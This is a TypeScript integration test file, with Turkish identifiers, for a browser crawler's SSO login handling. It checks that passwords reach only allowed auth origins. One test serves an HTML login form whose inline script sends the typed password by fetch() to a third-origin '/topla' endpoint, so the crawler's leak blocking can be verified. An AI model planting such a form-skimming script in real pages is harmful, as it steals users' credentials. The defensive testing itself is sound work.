import { createServer, type Server } from 'node:http';
import { access, readFile, stat } from 'node:fs/promises';
import { join } from 'node:path';
import { chromium } from '@playwright/test';
import { afterAll, beforeAll, describe, expect, it, type TestContext } from 'vitest';
import {
  CredentialLeakBlockedError,
  LoginDidNotReturnError,
  LoginFormOriginError,
  kesfet,
  sayfayiYenile,
} from '../../src/kesif/index.js';
import { EN_COK_ISTEK_KAYDI, SSO_BELIRTECI, baslat, baslatAuth } from '../kobay-demo/sunucu.mjs';
import { geciciDizinAc } from '../yardimci/gecici-dizin.js';

/**
 * Ayrı giriş sitesi (SSO) bütünleşmesi, gerçek Chromium ile. Uygulama `127.0.0.1`, auth sitesi
 * `localhost` adıyla (ikisi de 127.0.0.1'de dinler): localhost ile 127.0.0.1 farklı sitelerdir,
 * `ayniSiteOriginMi` kuralı değişmeden iki ayrı site elde edilir.
 */

interface IstekKaydi { method: string; path: string; body: string }
interface DemoSunucu { url: string; port: number; istekler: IstekKaydi[]; kapat: () => Promise<void> }

const PAROLA = 'demo123';
const kati = process.env.KOBAY_TEST_STRICT === '1';
let tarayiciEngeli: unknown;
const kapatilacaklar: Array<() => Promise<void>> = [];

beforeAll(async () => {
  try {
    const tarayici = await chromium.launch({ headless: true });
    await tarayici.close();
  } catch (hata) {
    tarayiciEngeli = hata;
  }
});

afterAll(async () => {
  await Promise.all(kapatilacaklar.map((kapat) => kapat()));
});

function tarayiciMumkun(context: TestContext): boolean {
  if (!tarayiciEngeli) return true;
  const ozet = String(tarayiciEngeli).split('\n')[0] ?? '';
  if (kati) throw new Error(`KOBAY_TEST_STRICT=1: Gerçek Chromium atlanamaz: ${ozet}`);
  context.skip(`Gerçek Chromium bu ortamda engelli: ${ozet}`);
  return false;
}

/** Önce auth (port bilinsin diye), sonra SSO kipinde uygulama. Auth, uygulamaya geri döner. */
async function ssoKur(a: { donmez?: boolean } = {}): Promise<{ app: DemoSunucu; auth: DemoSunucu; authOrigin: string }> {
  // Uygulamanın adresi auth sunucusu açılmadan bilinmeli; önce uygulama portu ayrılır.
  const yerTutucu = await baslat(0) as DemoSunucu;
  const appPort = yerTutucu.port;
  await yerTutucu.kapat();
  const auth = await baslatAuth(0, { appUrl: `http://127.0.0.1:${appPort}`, donmez: a.donmez === true }) as DemoSunucu;
  const authOrigin = `http://localhost:${auth.port}`;
  const app = await baslat(appPort, { sso: authOrigin }) as DemoSunucu;
  kapatilacaklar.push(auth.kapat, app.kapat);
  return { app, auth, authOrigin };
}

function parolaTasiyan(istekler: IstekKaydi[]): IstekKaydi[] {
  return istekler.filter((istek) => istek.body.includes(PAROLA) || istek.path.includes(PAROLA));
}

async function geciciDizin(): Promise<string> {
  return geciciDizinAc('kobay-sso-');
}

describe('ayrı giriş sitesi (SSO), gerçek Chromium', () => {
  it('auth origin\'de giriş → callback → uygulamaya dönüş → storageState; parola yalnız auth sitesine gider', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const { app, auth, authOrigin } = await ssoKur();
    const dizin = await geciciDizin();
    const storageStateYolu = join(dizin, 'storage.json');
    const harita = await kesfet({
      baseUrl: app.url,
      authOrigins: [authOrigin],
      kimlik: { username: 'demo', password: PAROLA, origin: app.url, authOrigins: [authOrigin] },
      storageStateYolu,
      maxSayfa: 5,
      sayfaZamanAsimiMs: 5_000,
    });
    expect(harita.loggedIn).toBe(true);
    // Keşif sınırı değişmez: haritada auth sitesinin sayfası yok, uygulama sayfaları var.
    expect(harita.pages.length).toBeGreaterThan(1);
    expect(harita.pages.every((sayfa) => new URL(sayfa.url).origin === app.url)).toBe(true);
    expect(harita.pages.map((sayfa) => sayfa.title)).toContain('Record List');
    // Parola yalnız auth sitesine (bir kez) gitti; uygulamaya hiç gitmedi.
    expect(parolaTasiyan(auth.istekler)).toHaveLength(1);
    expect(parolaTasiyan(app.istekler)).toEqual([]);
    expect(app.istekler.some((istek) => istek.path === `/sso-callback?token=${SSO_BELIRTECI}`)).toBe(true);
    // Oturum dosyası 0600; uygulamanın oturum çerezi ve auth sitesinin çerezi içinde.
    if (process.platform !== 'win32') expect((await stat(storageStateYolu)).mode & 0o777).toBe(0o600);
    const durum = JSON.parse(await readFile(storageStateYolu, 'utf8')) as { cookies: Array<{ name: string; domain: string }> };
    expect(durum.cookies).toEqual(expect.arrayContaining([
      expect.objectContaining({ name: 'session', domain: '127.0.0.1' }),
      expect.objectContaining({ name: 'auth_session', domain: 'localhost' }),
    ]));
  });

  it('loginUrl doğrudan auth origin\'de olabilir; sayfa yenileme de aynı kümeyle yeniden giriş yapar', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const { app, auth, authOrigin } = await ssoKur();
    const dizin = await geciciDizin();
    const kimlik = { username: 'demo', password: PAROLA, origin: app.url, authOrigins: [authOrigin] };
    const harita = await kesfet({
      baseUrl: app.url,
      loginUrl: `${authOrigin}/login`,
      authOrigins: [authOrigin],
      kimlik,
      storageStateYolu: join(dizin, 'storage.json'),
      maxSayfa: 2,
      sayfaZamanAsimiMs: 5_000,
    });
    expect(harita.loggedIn).toBe(true);
    // Oturum dosyası yokken yenileme: /records → auth girişine yönlenir → giriş → geri döner.
    const ozet = await sayfayiYenile({
      baseUrl: app.url,
      url: '/records',
      authOrigins: [authOrigin],
      kimlik,
      storageStateYolu: join(await geciciDizin(), 'storage.json'),
      sayfaZamanAsimiMs: 5_000,
    });
    expect(ozet.title).toBe('Record List');
    expect(parolaTasiyan(app.istekler)).toEqual([]);
    expect(parolaTasiyan(auth.istekler)).toHaveLength(2);
  });

  it('auth origin listede yokken bugünkü hata aynen: parola yazılmaz, auth sitesine gitmez', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const { app, auth } = await ssoKur();
    const dizin = await geciciDizin();
    await expect(kesfet({
      baseUrl: app.url,
      kimlik: { username: 'demo', password: PAROLA, origin: app.url },
      storageStateYolu: join(dizin, 'storage.json'),
      maxSayfa: 1,
      sayfaZamanAsimiMs: 5_000,
    })).rejects.toThrow(LoginFormOriginError);
    await expect(kesfet({
      baseUrl: app.url,
      kimlik: { username: 'demo', password: PAROLA, origin: app.url },
      storageStateYolu: join(dizin, 'storage.json'),
      maxSayfa: 1,
      sayfaZamanAsimiMs: 5_000,
    })).rejects.toThrow('The login page is on a different origin');
    expect(parolaTasiyan(auth.istekler)).toEqual([]);
  });

  it('giriş auth sitesinde kalırsa (callback yok) uygulamaya dönmedi hatası; oturum yazılmaz', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const { app, authOrigin } = await ssoKur({ donmez: true });
    const storageStateYolu = join(await geciciDizin(), 'storage.json');
    const hata = await kesfet({
      baseUrl: app.url,
      authOrigins: [authOrigin],
      kimlik: { username: 'demo', password: PAROLA, origin: app.url, authOrigins: [authOrigin] },
      storageStateYolu,
      maxSayfa: 1,
      sayfaZamanAsimiMs: 5_000,
    }).then(() => null, (yakalanan: unknown) => yakalanan);
    expect(hata).toBeInstanceOf(LoginDidNotReturnError);
    expect(hata).toBeInstanceOf(LoginFormOriginError);
    expect(String(hata)).toContain(`Login did not return to the app origin (ended on ${authOrigin}`);
    await expect(access(storageStateYolu)).rejects.toMatchObject({ code: 'ENOENT' });
  });

  // Üçüncü site: `kotu.localhost` — ne uygulamayla (127.0.0.1) ne auth ile (localhost) aynı site.
  // `localhost` başka port: auth origin'iyle aynı ana makine; auth origin TAM eşitlik istediği
  // için yine yabancıdır (eski aynı-site kuralı burada parolayı geçirirdi).
  it.for([
    ['başka site (kotu.localhost)', 'kotu.localhost'],
    ['auth origin ile aynı ana makine, başka port (localhost:P2)', 'localhost'],
  ] as const)('auth sayfası parolayı üçüncü bir origin\'e göndermeye çalışırsa kesilir: %s', async ([, ucuncuAd], context) => {
    if (!tarayiciMumkun(context)) return;
    const ucuncuIstekler: string[] = [];
    const ucuncu: Server = createServer((istek, yanit) => {
      let govde = '';
      istek.on('data', (parca: Buffer) => { govde += parca.toString(); });
      istek.on('end', () => {
        ucuncuIstekler.push(`${istek.method ?? ''} ${istek.url ?? ''} ${govde}`);
        yanit.writeHead(200, { 'access-control-allow-origin': '*' });
        yanit.end('ok');
      });
    });
    const ucuncuPort = await new Promise<number>((coz) => {
      ucuncu.listen(0, '127.0.0.1', () => {
        const adres = ucuncu.address();
        coz(typeof adres === 'object' && adres !== null ? adres.port : 0);
      });
    });
    kapatilacaklar.push(() => new Promise((coz) => { ucuncu.close(() => coz()); }));
    const ucuncuUrl = `http://${ucuncuAd}:${ucuncuPort}`;

    const yerTutucu = await baslat(0) as DemoSunucu;
    const appPort = yerTutucu.port;
    await yerTutucu.kapat();
    const authIstekleri: string[] = [];
    const auth: Server = createServer((istek, yanit) => {
      let govde = '';
      istek.on('data', (parca: Buffer) => { govde += parca.toString(); });
      istek.on('end', () => {
        authIstekleri.push(`${istek.method ?? ''} ${istek.url ?? ''} ${govde}`);
        if (istek.method === 'POST') {
          yanit.writeHead(302, { location: `http://127.0.0.1:${appPort}/sso-callback?token=${SSO_BELIRTECI}` });
          yanit.end();
          return;
        }
        yanit.writeHead(200, { 'content-type': 'text/html' });
        yanit.end('<!doctype html><html><body><form id="f" action="/login" method="post">'
          + '<input type="text" name="username"><input type="password" name="password"><button type="submit">Sign in</button></form>'
          + `<script>document.getElementById('f').addEventListener('submit',(e)=>{const p=e.target.password.value;`
          + `fetch(${JSON.stringify(ucuncuUrl)}+'/topla',{method:'POST',mode:'no-cors',body:p});});</script></body></html>`);
      });
    });
    const authPort = await new Promise<number>((coz) => {
      auth.listen(0, '127.0.0.1', () => {
        const adres = auth.address();
        coz(typeof adres === 'object' && adres !== null ? adres.port : 0);
      });
    });
    kapatilacaklar.push(() => new Promise((coz) => { auth.close(() => coz()); }));
    const authOrigin = `http://localhost:${authPort}`;
    const app = await baslat(appPort, { sso: authOrigin }) as DemoSunucu;
    kapatilacaklar.push(app.kapat);

    await expect(kesfet({
      baseUrl: app.url,
      authOrigins: [authOrigin],
      kimlik: { username: 'demo', password: PAROLA, origin: app.url, authOrigins: [authOrigin] },
      storageStateYolu: join(await geciciDizin(), 'storage.json'),
      maxSayfa: 1,
      sayfaZamanAsimiMs: 5_000,
    })).rejects.toThrow(CredentialLeakBlockedError);
    // Üçüncü siteye hiçbir istek ulaşmadı; parola yalnız auth sitesine (form) gitti.
    expect(ucuncuIstekler).toEqual([]);
    expect(authIstekleri.filter((satir) => satir.includes(PAROLA))).toHaveLength(1);
    expect(parolaTasiyan(app.istekler)).toEqual([]);
  });
});

describe('demo sunucu istek kaydı', () => {
  it('en çok 200 kayıt tutar, eskisi düşer; dizi başvurusu aynı kalır', async () => {
    const app = await baslat(0) as DemoSunucu;
    try {
      const kayitlar = app.istekler;
      for (let sira = 0; sira < EN_COK_ISTEK_KAYDI + 50; sira += 1) {
        // Yönlendirme izlenmez: her çağrı tek kayıt.
        await (await fetch(`${app.url}/istek-${sira}`, { redirect: 'manual' })).arrayBuffer();
      }
      expect(EN_COK_ISTEK_KAYDI).toBe(200);
      expect(app.istekler).toBe(kayitlar);
      expect(app.istekler).toHaveLength(EN_COK_ISTEK_KAYDI);
      expect(app.istekler[0]?.path).toBe('/istek-50');
      expect(app.istekler.at(-1)?.path).toBe(`/istek-${EN_COK_ISTEK_KAYDI + 49}`);
    } finally {
      await app.kapat();
    }
  });
});
